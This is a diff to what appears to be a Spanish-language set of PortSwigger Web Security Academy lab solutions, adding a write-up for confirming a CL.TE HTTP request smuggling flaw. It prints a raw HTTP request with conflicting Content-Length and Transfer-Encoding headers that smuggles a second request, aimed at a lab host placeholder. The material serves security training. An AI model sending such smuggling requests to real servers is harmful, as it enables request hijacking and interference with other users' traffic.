@@ -500,6 +500,24 @@ Transfer-Encoding: chunked
 
 ```
 
+### [HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)
+
+#### Solución:
+
+Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater):
+
+```
+POST / HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Length: 30
+Transfer-Encoding: chunked
+
+0
+
+GET /asd HTTP/1.1
+Foo: bar
+```
+
 ---
 
 ## [OS command injection](https://portswigger.net/web-security/os-command-injection)
